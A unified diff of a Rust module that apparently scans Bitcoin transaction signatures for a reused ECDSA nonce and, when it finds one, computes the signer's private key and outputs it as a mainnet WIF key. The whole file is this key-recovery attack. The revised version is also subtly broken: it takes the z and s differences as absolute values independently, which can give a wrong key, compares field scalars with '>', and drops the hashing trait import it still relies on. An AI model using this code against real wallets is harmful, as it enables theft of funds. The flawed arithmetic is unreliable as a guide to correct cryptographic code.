@@ -1,132 +1,138 @@
-use anyhow::Result;
-use k256::{Scalar, elliptic_curve::PrimeField};
-use num_bigint::BigUint;
+use anyhow::{anyhow, Result};
+use k256::{
+    ecdsa::Signature as K256Signature,
+    Scalar,
+    elliptic_curve::PrimeField,
+};
+use num_bigint::{BigUint, ToBigUint};
 use num_traits::{One, Zero, ToPrimitive};
 use num_integer::Integer;
-use sha2::{Sha256, Digest};
 use std::str::FromStr;
 use crate::types::{SignatureRow, RecoveredKeyRow};
 
-pub fn attempt_recover_k_and_priv(sig1: &SignatureRow, sig2: &SignatureRow) -> Option<RecoveredKeyRow> {
-    // Parse hex strings to BigUint
-    let r = BigUint::from_str_radix(&sig1.r, 16).ok()?;
-    let s1 = BigUint::from_str_radix(&sig1.s, 16).ok()?;
-    let s2 = BigUint::from_str_radix(&sig2.s, 16).ok()?;
-    let z1 = BigUint::from_str_radix(&sig1.z, 16).ok()?;
-    let z2 = BigUint::from_str_radix(&sig2.z, 16).ok()?;
-
-    // Convert to k256::Scalar for modular arithmetic
-    let r_scalar = scalar_from_biguint(&r)?;
-    let s1_scalar = scalar_from_biguint(&s1)?;
-    let s2_scalar = scalar_from_biguint(&s2)?;
-    let z1_scalar = scalar_from_biguint(&z1)?;
-    let z2_scalar = scalar_from_biguint(&z2)?;
-
-    // secp256k1 curve order n (correct values)
-    let n = Scalar::from_repr(
-        k256::FieldBytes::from_slice(&[
-            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFE,
-            0xBA, 0xAE, 0xDC, 0xE6, 0xAF, 0x48, 0xA0, 0x3B,
-            0xBF, 0xD2, 0x5E, 0x8C, 0xD0, 0x36, 0x41, 0x41
-        ]).unwrap()
-    ).unwrap();
-
-    // k = (z1 - z2) * (s1 - s2)^-1 mod n
-    let z_diff = z1_scalar.sub(&z2_scalar).normalize();
-    let s_diff = s1_scalar.sub(&s2_scalar).normalize();
-    let s_diff_inv = s_diff.invert().unwrap();
-    let k = z_diff.mul(&s_diff_inv).normalize();
-
-    // priv = (s1 * k - z1) * r^-1 mod n
-    let r_inv = r_scalar.invert().unwrap();
-    let sk1 = s1_scalar.mul(&k).normalize();
-    let sk1_minus_z1 = sk1.sub(&z1_scalar).normalize();
-    let private_key_scalar = sk1_minus_z1.mul(&r_inv).normalize();
-
-    // Convert back to BigUint for WIF conversion
-    let private_key_biguint = BigUint::from_bytes_be(&private_key_scalar.to_bytes().into());
+/// Attempts to recover the private key using the ECDSA reused-k attack
+/// This attack works when the same k value is used in two different signatures
+pub fn attempt_recover_k_and_priv(
+    sig1: &SignatureRow,
+    sig2: &SignatureRow,
+) -> Result<Option<RecoveredKeyRow>> {
+    // Parse R, S, and Z values from hex strings
+    let r1 = parse_hex_to_scalar(&sig1.r)?;
+    let s1 = parse_hex_to_scalar(&sig1.s)?;
+    let z1 = parse_hex_to_scalar(&sig1.z)?;
     
-    // Convert to WIF format
-    let wif = bigint_to_wif(&private_key_biguint).ok()?;
+    let r2 = parse_hex_to_scalar(&sig2.r)?;
+    let s2 = parse_hex_to_scalar(&sig2.s)?;
+    let z2 = parse_hex_to_scalar(&sig2.z)?;
 
-    Some(RecoveredKeyRow {
+    // Check if R values are the same (same k value used)
+    if r1 != r2 {
+        return Ok(None);
+    }
+
+    // Check if Z values are different (different messages)
+    if z1 == z2 {
+        return Ok(None);
+    }
+
+    // Calculate the difference in Z values
+    let z_diff = if z1 > z2 {
+        z1 - z2
+    } else {
+        z2 - z1
+    };
+
+    // Calculate the difference in S values
+    let s_diff = if s1 > s2 {
+        s1 - s2
+    } else {
+        s2 - s1
+    };
+
+    // Calculate the inverse of the S difference
+    let s_diff_inv = s_diff.invert().unwrap_or(Scalar::ZERO);
+    if s_diff_inv == Scalar::ZERO {
+        return Ok(None);
+    }
+
+    // Calculate k = (z1 - z2) * (s1 - s2)^(-1) mod n
+    let k = z_diff * s_diff_inv;
+
+    // Calculate the private key: priv = (s1 * k - z1) * r^(-1) mod n
+    let r_inv = r1.invert().unwrap_or(Scalar::ZERO);
+    if r_inv == Scalar::ZERO {
+        return Ok(None);
+    }
+
+    let priv_key = (s1 * k - z1) * r_inv;
+
+    // Convert private key to WIF format
+    let private_key_wif = scalar_to_wif(&priv_key)?;
+
+    Ok(Some(RecoveredKeyRow {
         txid1: sig1.txid.clone(),
         txid2: sig2.txid.clone(),
         r: sig1.r.clone(),
-        private_key: wif,
-    })
+        private_key: private_key_wif,
+    }))
 }
 
-fn scalar_from_biguint(bigint: &BigUint) -> Option<Scalar> {
-    let bytes = bigint.to_bytes_be();
-    if bytes.len() > 32 {
-        return None; // Too large for secp256k1 scalar
+fn parse_hex_to_scalar(hex_str: &str) -> Result<Scalar> {
+    let bytes = hex::decode(hex_str)?;
+    if bytes.len() != 32 {
+        return Err(anyhow!("Expected 32 bytes for scalar, got {}", bytes.len()));
     }
     
-    let mut field_bytes = [0u8; 32];
-    let start = 32 - bytes.len();
-    field_bytes[start..].copy_from_slice(&bytes);
+    let mut buf = [0u8; 32];
+    buf.copy_from_slice(&bytes);
     
-    Scalar::from_repr(k256::FieldBytes::from_slice(&field_bytes).unwrap()).ok()
+    Scalar::from_repr(buf.into())
+        .ok_or_else(|| anyhow!("Invalid scalar value"))
 }
 
-fn bigint_to_wif(private_key: &BigUint) -> Result<String> {
-    // Convert to 32-byte array
-    let mut key_bytes = [0u8; 32];
-    let key_vec = private_key.to_bytes_be();
-    let start = 32 - key_vec.len();
-    key_bytes[start..].copy_from_slice(&key_vec);
+fn scalar_to_wif(scalar: &Scalar) -> Result<String> {
+    // Convert scalar to bytes
+    let bytes = scalar.to_bytes();
     
-    // Add version byte (0x80 for mainnet)
-    let mut extended_key = vec![0x80];
-    extended_key.extend_from_slice(&key_bytes);
+    // Add version byte (0x80 for mainnet private key)
+    let mut wif_bytes = vec![0x80];
+    wif_bytes.extend_from_slice(&bytes);
     
-    // Add compression flag (0x01 for compressed public key)
-    extended_key.push(0x01);
+    // Add compression flag (0x01 for compressed public keys)
+    wif_bytes.push(0x01);
     
-    // Double SHA256 for checksum
-    let checksum = double_sha256(&extended_key);
-    extended_key.extend_from_slice(&checksum[..4]);
+    // Double SHA256 hash
+    let hash1 = sha2::Sha256::digest(&wif_bytes);
+    let hash2 = sha2::Sha256::digest(&hash1);
+    
+    // Add first 4 bytes of double hash as checksum
+    wif_bytes.extend_from_slice(&hash2[..4]);
     
     // Base58 encode
-    let wif = base58_encode(&extended_key);
-    Ok(wif)
+    Ok(base58_encode(&wif_bytes))
 }
 
-fn double_sha256(data: &[u8]) -> Vec<u8> {
-    let mut hasher = Sha256::new();
-    hasher.update(data);
-    let first_hash = hasher.finalize();
+fn base58_encode(bytes: &[u8]) -> String {
+    let alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+    let base = 58u32;
     
-    let mut hasher = Sha256::new();
-    hasher.update(first_hash);
-    let second_hash = hasher.finalize();
+    let mut num = BigUint::from_bytes_be(bytes);
+    let mut result = String::new();
     
-    second_hash.to_vec()
-}
-
-fn base58_encode(data: &[u8]) -> String {
-    const ALPHABET: &[u8] = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
-    
-    let mut num = BigUint::from_bytes_be(data);
-    let mut result = Vec::new();
-    
-    while !num.is_zero() {
-        let (quotient, remainder) = num.div_rem(&BigUint::from(58u32));
+    while num > BigUint::zero() {
+        let (quotient, remainder) = num.div_rem(&base.to_biguint().unwrap());
+        result.push(alphabet.chars().nth(remainder.to_u32().unwrap() as usize).unwrap());
         num = quotient;
-        result.push(ALPHABET[remainder.to_usize().unwrap()]);
     }
     
-    // Add leading zeros
-    for &byte in data {
+    // Add leading '1's for each leading zero byte
+    for &byte in bytes {
         if byte == 0 {
-            result.push(b'1');
+            result.push('1');
         } else {
             break;
         }
     }
     
-    result.reverse();
-    String::from_utf8(result).unwrap()
+    result.chars().rev().collect()
 }
